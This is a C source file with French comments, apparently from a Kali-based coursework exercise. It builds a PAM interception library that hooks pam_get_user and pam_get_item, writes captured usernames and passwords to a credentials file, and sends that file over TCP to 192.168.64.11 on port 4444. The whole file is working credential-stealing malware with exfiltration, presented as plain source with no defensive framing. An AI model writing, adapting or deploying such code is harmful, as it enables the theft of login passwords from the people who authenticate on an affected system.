#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <dlfcn.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <syslog.h>
#include <time.h>
#include <errno.h> // Ajouté pour errno et strerror

// Définition des pointeurs vers les fonctions PAM d'origine
typedef int (*pam_get_item_t)(const pam_handle_t *, int, const void **);
typedef int (*pam_get_user_t)(pam_handle_t *, const char **, const char *);

// Fonction pour obtenir l'heure actuelle en tant que chaîne
const char *get_current_time() {
    static char buffer[20];
    time_t raw_time = time(NULL);
    struct tm *time_info = localtime(&raw_time);
    strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", time_info);
    return buffer;
}

// Fonction pour écrire les credentials dans un fichier
void write_to_file(const char *filepath, const char *type, const char *data) {
    FILE *file = fopen(filepath, "a");
    if (!file) {
        syslog(LOG_ERR, "[ERROR] Erreur lors de l'ouverture du fichier : %s", filepath);
        return;
    }
    fprintf(file, "[%s] %s : %s\n", get_current_time(), type, data);
    fclose(file);
    syslog(LOG_DEBUG, "[DEBUG] Écriture dans %s effectuée", filepath);
}

// Fonction pour envoyer les données via TCP
void send_file_tcp(const char *filepath, const char *remote_host, int remote_port) {
    int sock;
    struct sockaddr_in server_addr;
    char buffer[1024];
    FILE *file;

    // Création du socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        syslog(LOG_ERR, "[ERROR] Échec de la création du socket : %s", strerror(errno));
        return;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(remote_port);
    inet_pton(AF_INET, remote_host, &server_addr.sin_addr);

    syslog(LOG_DEBUG, "[DEBUG] Tentative de connexion à %s:%d", remote_host, remote_port);

    // Connexion au serveur
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        syslog(LOG_ERR, "[ERROR] Échec de la connexion au serveur : %s", strerror(errno));
        close(sock);
        return;
    }

    syslog(LOG_DEBUG, "[DEBUG] Connexion établie avec %s:%d", remote_host, remote_port);

    // Ouverture du fichier
    file = fopen(filepath, "r");
    if (!file) {
        syslog(LOG_ERR, "[ERROR] Impossible d'ouvrir le fichier : %s", filepath);
        close(sock);
        return;
    }

    // Lecture et envoi du fichier
    size_t bytes_read;
    while ((bytes_read = fread(buffer, 1, sizeof(buffer), file)) > 0) {
        if (send(sock, buffer, bytes_read, 0) < 0) {
            syslog(LOG_ERR, "[ERROR] Échec de l'envoi des données : %s", strerror(errno));
            fclose(file);
            close(sock);
            return;
        }
    }

    syslog(LOG_DEBUG, "[DEBUG] Fichier %s envoyé avec succès à %s:%d", filepath, remote_host, remote_port);

    fclose(file);
    close(sock);
}

// Intercepteur pour pam_get_user
int pam_get_user(pam_handle_t *pamh, const char **user, const char *prompt) {
    static pam_get_user_t original_pam_get_user = NULL;

    if (!original_pam_get_user) {
        original_pam_get_user = (pam_get_user_t)dlsym(RTLD_NEXT, "pam_get_user");
        if (!original_pam_get_user) {
            syslog(LOG_ERR, "[ERROR] Impossible de localiser pam_get_user : %s", dlerror());
            return PAM_SYSTEM_ERR;
        }
    }

    int retval = original_pam_get_user(pamh, user, prompt);
    if (retval == PAM_SUCCESS && *user) {
        const char *file_path = "/home/kali/Partiel_C/credentials.txt";
        write_to_file(file_path, "Login", *user);
    }

    return retval; // Retourne toujours PAM_SUCCESS pour éviter de bloquer l'authentification
}

// Intercepteur pour pam_get_item
int pam_get_item(const pam_handle_t *pamh, int item_type, const void **item) {
    static pam_get_item_t original_pam_get_item = NULL;

    if (!original_pam_get_item) {
        original_pam_get_item = (pam_get_item_t)dlsym(RTLD_NEXT, "pam_get_item");
        if (!original_pam_get_item) {
            syslog(LOG_ERR, "[ERROR] Impossible de localiser pam_get_item : %s", dlerror());
            return PAM_SYSTEM_ERR;
        }
    }

    int retval = original_pam_get_item(pamh, item_type, item);
    if (retval == PAM_SUCCESS && item_type == PAM_AUTHTOK && item && *item) {
        const char *file_path = "/home/kali/Partiel_C/credentials.txt";
        write_to_file(file_path, "Mot de passe", (const char *)*item);

        // Envoi du fichier via TCP
        send_file_tcp(file_path, "192.168.64.11", 4444);
    }

    return retval; // Retourne toujours PAM_SUCCESS pour éviter de bloquer l'authentification
}

